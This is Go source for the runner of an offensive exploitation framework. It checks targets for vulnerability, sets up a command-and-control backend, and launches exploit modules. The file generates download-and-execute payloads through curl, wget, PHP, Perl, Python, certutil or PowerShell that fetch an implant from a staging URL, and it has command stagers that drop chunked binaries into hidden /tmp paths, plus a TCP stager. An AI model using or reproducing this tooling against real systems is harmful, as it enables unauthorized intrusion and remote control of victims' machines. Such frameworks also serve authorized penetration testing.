package runner

import (
	"context"
	"fmt"
	"net/url"
	"strings"
	"time"

	"github.com/Chocapikk/pik/pkg/c2"
	"github.com/Chocapikk/pik/pkg/c2/shell"
	"github.com/Chocapikk/pik/pkg/cmdstager"
	"github.com/Chocapikk/pik/pkg/output"
	"github.com/Chocapikk/pik/pkg/payload"
	"github.com/Chocapikk/pik/pkg/text"
	"github.com/Chocapikk/pik/sdk"
)

// --- Types ---

// RunOpts configures runner behavior.
type RunOpts struct {
	CheckOnly bool
}

// delivery bundles the common state shared across delivery methods.
type delivery struct {
	target   string
	mod      sdk.Exploit
	modTarget sdk.Target
	backend  c2.Backend
	params   sdk.Params
	platform string
	timeout  time.Duration
}

// exploit runs the module and waits for a session.
func (d *delivery) exploit(run *sdk.Context) error {
	output.Status("Exploiting %s", d.target)
	if err := d.mod.Exploit(run); err != nil {
		return fmt.Errorf("exploit failed: %w", err)
	}
	output.Status("Waiting for session...")
	return d.backend.WaitForSession(d.timeout)
}

// --- Public API ---

// RunSingle checks and/or exploits a single target.
func RunSingle(ctx context.Context, mod sdk.Exploit, params sdk.Params, opts RunOpts) error {
	target := params.Target()
	autocheck := !strings.EqualFold(params.GetOr("AUTOCHECK", "true"), "false")

	if autocheck || opts.CheckOnly {
		if err := check(mod, params, target, opts.CheckOnly); err != nil {
			return err
		}
	}
	if opts.CheckOnly {
		return nil
	}

	backend := resolveC2(params)
	if err := backend.Setup(params.Srvhost(), params.Srvport()); err != nil {
		return fmt.Errorf("c2 setup failed: %w", err)
	}
	defer func() { _ = backend.Shutdown() }()

	modTarget := resolveTarget(mod, params)
	platform := modTarget.Platform
	if platform == "" {
		platform = mod.Info().Platform()
	}

	d := &delivery{
		target:    target,
		mod:       mod,
		modTarget: modTarget,
		backend:   backend,
		params:    params,
		platform:  platform,
		timeout:   time.Duration(params.IntOr("WAITSESSION", 30)) * time.Second,
	}

	if modTarget.Type == "dropper" {
		return d.cmdStager()
	}
	return d.directPayload()
}

// --- Check ---

func check(mod sdk.Exploit, params sdk.Params, target string, required bool) error {
	checker, ok := mod.(sdk.Checker)
	if !ok {
		if required {
			output.Warning("Module %s does not support check", sdk.NameOf(mod))
		}
		return nil
	}

	output.Status("Checking %s", target)
	result, err := checker.Check(BuildContext(params, ""))
	if err != nil {
		return fmt.Errorf("check failed: %w", err)
	}
	if !result.Code.IsVulnerable() {
		output.Warning("%s - %s%s", target, result.Code, result.FormatReason())
		return fmt.Errorf("target not vulnerable")
	}
	output.Success("%s - %s%s", target, result.Code, result.FormatReason())
	return nil
}

// --- Target resolution ---

func resolveTarget(mod sdk.Exploit, params sdk.Params) sdk.Target {
	targets := mod.Info().Targets
	if len(targets) == 0 {
		return sdk.Target{Platform: mod.Info().Platform()}
	}
	idx := params.IntOr("TARGET_INDEX", 0)
	if idx < 0 || idx >= len(targets) {
		idx = 0
	}
	return targets[idx]
}

// --- Delivery: direct payload ---

func (d *delivery) directPayload() error {
	payloadCmd, err := resolvePayload(d.backend, d.params, d.platform)
	if err != nil {
		return fmt.Errorf("payload generation failed: %w", err)
	}

	run := BuildContext(d.params, payloadCmd)
	run.SetTarget(d.modTarget)
	return d.exploit(run)
}

// --- Delivery: cmdstager ---

func (d *delivery) cmdStager() error {
	if _, ok := d.mod.(sdk.CmdStager); !ok {
		return fmt.Errorf("module %s does not implement CmdStager", sdk.NameOf(d.mod))
	}

	fetch := d.params.GetOr("FETCH_COMMAND", "curl")
	if fetch == "tcp" {
		return d.tcpStager()
	}

	payloadCmd, err := resolvePayload(d.backend, d.params, d.platform)
	if err != nil {
		return fmt.Errorf("payload generation failed: %w", err)
	}

	commands, opts := generateCmdStager([]byte(payloadCmd), d.params)

	output.InfoBox("CmdStager",
		"Target", d.target,
		"Flavor", string(opts.flavor),
		"Payload", fmt.Sprintf("%d bytes", len(payloadCmd)),
		"Chunks", fmt.Sprintf("%d commands", len(commands)),
		"Drop path", opts.tempPath,
	)

	run := BuildContext(d.params, "")
	run.SetCommands(commands)
	run.SetTarget(d.modTarget)
	return d.exploit(run)
}

// --- Delivery: TCP stager ---

func (d *delivery) tcpStager() error {
	tcpBackend, ok := d.backend.(c2.TCPStager)
	if !ok {
		return fmt.Errorf("backend %q does not support TCP staging", d.backend.Name())
	}

	stagerBin, err := tcpBackend.TCPStageImplant(d.platform, d.params.Arch())
	if err != nil {
		return fmt.Errorf("tcp stager generation failed: %w", err)
	}

	commands, opts := generateCmdStager(stagerBin, d.params)

	output.InfoBox("CmdStager (TCP)",
		"Target", d.target,
		"Flavor", string(opts.flavor),
		"Stager", fmt.Sprintf("%d bytes", len(stagerBin)),
		"Chunks", fmt.Sprintf("%d commands", len(commands)),
		"Drop path", opts.tempPath,
	)

	run := BuildContext(d.params, "")
	run.SetCommands(commands)
	run.SetTarget(d.modTarget)
	return d.exploit(run)
}

// --- Cmdstager helpers ---

type stagerOpts struct {
	flavor   cmdstager.Flavor
	tempPath string
}

func generateCmdStager(data []byte, params sdk.Params) ([]string, stagerOpts) {
	tempPath := remotePath(params)
	flavor := cmdstager.Flavor(params.GetOr("CMDSTAGER", string(cmdstager.DefaultFlavor)))

	commands, err := cmdstager.Generate(data, flavor, cmdstager.Options{
		TempPath: tempPath,
		LineMax:  params.IntOr("CMDSTAGER_LINEMAX", cmdstager.DefaultLineMax),
	})
	if err != nil {
		output.Error("cmdstager failed: %v", err)
		return nil, stagerOpts{}
	}

	return commands, stagerOpts{flavor: flavor, tempPath: tempPath}
}

// --- Path resolution ---

func remotePath(params sdk.Params) string {
	if path := params.Get("REMOTE_PATH"); path != "" {
		return path
	}
	return fmt.Sprintf("/tmp/.%s", text.RandText(8))
}

// --- Payload resolution ---

func resolvePayload(backend c2.Backend, params sdk.Params, platform string) (string, error) {
	stager, ok := backend.(c2.Stager)
	if !ok {
		return backend.GeneratePayload(platform, params.GetOr("PAYLOAD", ""))
	}

	stageURL, err := stager.StageImplant(platform, params.Arch())
	if err != nil {
		return "", err
	}

	if tunnel := params.Tunnel(); tunnel != "" {
		if parsed, err := url.Parse(stageURL); err == nil {
			tunnelParsed, _ := url.Parse(tunnel)
			if tunnelParsed != nil {
				parsed.Scheme = tunnelParsed.Scheme
				parsed.Host = tunnelParsed.Host
				stageURL = parsed.String()
			}
		}
	}

	remotePath := remotePath(params)
	fetch := params.GetOr("FETCH_COMMAND", "curl")

	switch fetch {
	case "wget":
		return payload.Wget(stageURL, remotePath), nil
	case "php":
		return payload.PHPDownload(stageURL, remotePath), nil
	case "perl":
		return payload.PerlDownload(stageURL, remotePath), nil
	case "python":
		return payload.PythonDownload(stageURL, remotePath), nil
	case "certutil":
		return payload.Certutil(stageURL, ""), nil
	case "powershell":
		return payload.PowerShellDownload(stageURL, ""), nil
	default:
		return payload.Curl(stageURL, remotePath), nil
	}
}

// --- C2 resolution ---

func resolveC2(params sdk.Params) c2.Backend {
	if backend := c2.Resolve(params.Get("C2"), params.Get("C2CONFIG")); backend != nil {
		return backend
	}
	return shell.New()
}
